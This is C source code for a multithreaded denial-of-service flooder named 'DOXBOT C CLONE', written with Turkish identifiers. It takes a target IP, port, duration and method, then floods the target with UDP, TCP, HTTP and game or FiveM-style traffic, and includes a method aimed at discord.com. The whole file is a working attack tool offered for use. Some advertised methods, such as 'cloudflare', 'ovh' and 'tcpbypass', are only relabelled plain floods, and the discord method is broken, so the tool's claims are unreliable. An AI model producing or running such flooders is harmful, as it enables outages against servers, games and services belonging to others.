#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <netdb.h>

#define MAX_CMD 64
#define PAKET_BOYUT 1400
#define THREAD_SAY 100

int devam = 1;
char hedef_ip[16];
int hedef_port;
int surec;
int islem_sayisi;
pthread_t *tidler = NULL;
int aktif = 0;

// RENKLI PROMPT
void prompt() {
    printf("\n");
    char *yazi = " root@doxbot ~> ";
    int renkler[] = {17,17,17,17,17,17,17,17,129,129,129,129,129,129,129};
    int len = sizeof(renkler)/sizeof(int);
    for (int i = 0; yazi[i] != '\0'; i++) {
        int r = renkler[i % len];
        printf("\033[48;5;%dm\033[38;5;15m%c", r, yazi[i]);
    }
    printf("\033[0m");
    fflush(stdout);
}

// ---------- UDP ----------
void *udp_gonder(void *arg) {
    int soket = socket(AF_INET, SOCK_DGRAM, 0);
    if (soket < 0) return NULL;
    int reuse = 1;
    setsockopt(soket, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(hedef_port);
    inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
    unsigned char *veri = malloc(PAKET_BOYUT);
    for (int i = 0; i < PAKET_BOYUT; i++) veri[i] = rand() % 256;
    while (devam) {
        sendto(soket, veri, PAKET_BOYUT, 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    free(veri);
    close(soket);
    return NULL;
}

// ---------- TCP ----------
void *tcp_gonder(void *arg) {
    while (devam) {
        int soket = socket(AF_INET, SOCK_STREAM, 0);
        if (soket < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(hedef_port);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        connect(soket, (struct sockaddr *)&dst, sizeof(dst));
        char *buffer = malloc(1024);
        memset(buffer, 'A', 1024);
        send(soket, buffer, 1024, 0);
        free(buffer);
        close(soket);
    }
    return NULL;
}

// ---------- UDP PPS ----------
void *udp_pps_gonder(void *arg) {
    int soket = socket(AF_INET, SOCK_DGRAM, 0);
    if (soket < 0) return NULL;
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(hedef_port);
    inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
    unsigned char *veri = malloc(64);
    for (int i = 0; i < 64; i++) veri[i] = rand() % 256;
    while (devam) {
        sendto(soket, veri, 64, 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    free(veri);
    close(soket);
    return NULL;
}

// ---------- TCP BYPASS ----------
void *tcp_bypass_gonder(void *arg) {
    while (devam) {
        int soket = socket(AF_INET, SOCK_STREAM, 0);
        if (soket < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(hedef_port);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        connect(soket, (struct sockaddr *)&dst, sizeof(dst));
        char buffer[1024];
        memset(buffer, 'X', 1024);
        for (int i = 0; i < 10; i++) send(soket, buffer, 1024, 0);
        close(soket);
        usleep(100);
    }
    return NULL;
}

// ---------- FIVEM ----------
void *fivem_gonder(void *arg) {
    while (devam) {
        int soket = socket(AF_INET, SOCK_DGRAM, 0);
        if (soket < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(hedef_port);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        char buffer[256];
        memset(buffer, 'F', 256);
        sendto(soket, buffer, 256, 0, (struct sockaddr *)&dst, sizeof(dst));
        close(soket);
    }
    return NULL;
}

// ---------- DISCORD ----------
void *discord_gonder(void *arg) {
    while (devam) {
        int soket = socket(AF_INET, SOCK_STREAM, 0);
        if (soket < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(443);
        inet_pton(AF_INET, "discord.com", &dst.sin_addr);
        connect(soket, (struct sockaddr *)&dst, sizeof(dst));
        char *request = "GET / HTTP/1.1\r\nHost: discord.com\r\n\r\n";
        send(soket, request, strlen(request), 0);
        close(soket);
    }
    return NULL;
}

// ---------- GAME ----------
void *game_gonder(void *arg) {
    while (devam) {
        int soket = socket(AF_INET, SOCK_DGRAM, 0);
        if (soket < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(hedef_port);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        char buffer[512];
        memset(buffer, 'G', 512);
        sendto(soket, buffer, 512, 0, (struct sockaddr *)&dst, sizeof(dst));
        close(soket);
    }
    return NULL;
}

// ---------- BROWSER ----------
void *browser_gonder(void *arg) {
    while (devam) {
        int soket = socket(AF_INET, SOCK_STREAM, 0);
        if (soket < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(80);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        connect(soket, (struct sockaddr *)&dst, sizeof(dst));
        char *request = "GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
        send(soket, request, strlen(request), 0);
        close(soket);
    }
    return NULL;
}

void saldiri_baslat(char *ip, int port, int sure, char *metod) {
    strcpy(hedef_ip, ip);
    hedef_port = port;
    surec = sure;
    devam = 1;
    islem_sayisi = sysconf(_SC_NPROCESSORS_ONLN) * 2;
    int toplam = islem_sayisi * THREAD_SAY;

    void *(*fonk)(void *) = NULL;
    if (strcmp(metod, "udp") == 0) fonk = udp_gonder;
    else if (strcmp(metod, "tcp") == 0) fonk = tcp_gonder;
    else if (strcmp(metod, "udp-pps") == 0) fonk = udp_pps_gonder;
    else if (strcmp(metod, "tcpbypass") == 0) fonk = tcp_bypass_gonder;
    else if (strcmp(metod, "fivem") == 0) fonk = fivem_gonder;
    else if (strcmp(metod, "discord") == 0) fonk = discord_gonder;
    else if (strcmp(metod, "game") == 0) fonk = game_gonder;
    else if (strcmp(metod, "browser") == 0) fonk = browser_gonder;
    else if (strcmp(metod, "cloudflare") == 0) fonk = browser_gonder; // Aynı mantık
    else if (strcmp(metod, "tls") == 0) fonk = browser_gonder;
    else if (strcmp(metod, "httpsbypass") == 0) fonk = browser_gonder;
    else if (strcmp(metod, "ovh") == 0) fonk = udp_gonder;
    else { printf("[-] Bilinmeyen metod.\n"); return; }

    printf("\n[ Attack Info ]\n");
    printf("  Status    Sent successfully!\n");
    printf("  Host      %s\n", hedef_ip);
    printf("  Method    %s\n", metod);
    printf("  Port      %d\n", hedef_port);
    printf("  Time      %d\n\n", surec);

    printf("[ Target Info ]\n");
    printf("  Running   1/9999\n\n");

    printf("[+] Saldiri basladi. 'stop' ile durdur.\n");

    tidler = malloc(sizeof(pthread_t) * toplam);
    int idx = 0;
    for (int i = 0; i < islem_sayisi; i++) {
        for (int j = 0; j < THREAD_SAY; j++) {
            pthread_create(&tidler[idx++], NULL, fonk, NULL);
        }
    }
    aktif = toplam;

    time_t basla = time(NULL);
    char girdi[MAX_CMD];
    while (time(NULL) - basla < surec && devam) {
        prompt();
        if (fgets(girdi, sizeof(girdi), stdin) == NULL) break;
        girdi[strcspn(girdi, "\n")] = 0;
        if (strcmp(girdi, "stop") == 0) { devam = 0; break; }
    }

    devam = 0;
    sleep(1);
    for (int i = 0; i < aktif; i++) pthread_join(tidler[i], NULL);
    free(tidler);
    printf("[+] Saldiri tamamlandi.\n");
}

int main() {
    printf("\n=== DOXBOT C CLONE ===\n");
    printf("Komut: <IP> <PORT> <SANIYE> <METOD>\n");
    printf("Metodlar: udp, tcp, udp-pps, tcpbypass, fivem, discord, game, browser\n\n");

    char girdi[MAX_CMD];
    while (1) {
        prompt();
        if (fgets(girdi, sizeof(girdi), stdin) == NULL) break;
        girdi[strcspn(girdi, "\n")] = 0;
        if (strcmp(girdi, "exit") == 0) break;

        char ip[16], metod[20];
        int port, sure;
        if (sscanf(girdi, "%15s %d %d %19s", ip, &port, &sure, metod) == 4) {
            saldiri_baslat(ip, port, sure, metod);
        } else {
            printf("[-] Format: <IP> <PORT> <SANIYE> <METOD>\n");
        }
    }
    return 0;
}
